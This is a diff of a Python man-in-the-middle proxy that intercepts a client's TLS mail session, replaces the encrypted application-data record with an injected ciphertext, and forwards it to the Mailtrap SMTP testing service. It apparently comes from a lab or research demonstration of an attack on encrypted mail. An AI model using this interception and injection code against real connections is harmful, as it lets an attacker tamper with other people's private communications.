@@ -10,6 +10,9 @@ from tlslite.utils import python_aes
 host_IP = '127.0.0.127'
 host_port = 6944
 
+mailtrapIP = "smtp.mailtrap.io"
+mailtrapPort = 2525
+
 server_IP = 'localhost'
 server_port = 8025
 
@@ -34,7 +37,6 @@ class socketListener(Thread):
                         # 32 bytes string: M_star
                         n = 32
                         m_star = ''.join(random.choices(string.ascii_letters + string.digits, k=n)).encode('ascii')
-                        print(f'm_star={m_star}')
 
                         c_msg = self.c_socket.recv(1024) # send m stars 1 message
                         print(f'rcvd request={c_msg.decode()}')
@@ -87,19 +89,20 @@ class socketListener(Thread):
 
                         # get the cipher text
                         correct_idx = (rand_index_1 + 1) * (rand_index_2 + 1) - 1
+                        print(f'm_star1={m_star1}, m_star2={m_star2}, correct_idx={correct_idx}')
                         cipher_text = deserialized_c_msg[correct_idx]
-                        print(f'cipher_text={cipher_text}')
+                        # print(f'cipher_text={cipher_text}')
 
                         # send ack
                         self.c_socket.send(b'OK')
 
                         # intercept the mail and send it to the server
                         c_msg = self.c_socket.recv(1024)
-                        print(f'rcvd mail data: {c_msg}')
+                        # print(f'rcvd mail data: {c_msg}')
 
                         # replace eveything after '\x17\x03\x03\x00' with final_enc_data
                         # and send it to the server
-                        new_mail = b'\x17\x03\x03\x00\xc0' + cipher_text
+                        new_mail = b'\x17\x03\x03\x00\xe0' + cipher_text
                         c_msg = new_mail
 
                         print(f'new mail data: {c_msg}')
@@ -166,7 +169,7 @@ class socketListener(Thread):
 
             ''' forward the connection to the real server '''
             # connect to the real server
-            self.s_socket = socket.create_connection((server_IP, server_port))
+            self.s_socket = socket.create_connection((mailtrapIP, mailtrapPort))
             counter = 0
             while True:
                 valOne = self.rcv_from_client_fwd_to_server()
